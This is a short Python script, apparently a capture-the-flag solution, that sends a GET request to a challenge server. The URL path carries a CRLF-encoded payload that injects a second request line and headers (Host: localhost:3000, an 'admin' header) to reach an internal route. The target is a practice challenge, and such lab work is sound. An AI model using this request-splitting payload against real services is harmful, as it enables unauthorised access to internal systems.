import requests 

URL = "https://wonka.chal.cyberjousting.com" 

r = requests.get( 
    f"{URL}/name/1%20HTTP/1.1%0d%0aHost:%20localhost:3000%0d%0aa:%20admin%0d%0aX:%20", 
)

print(r.text)
print(r.status_code)

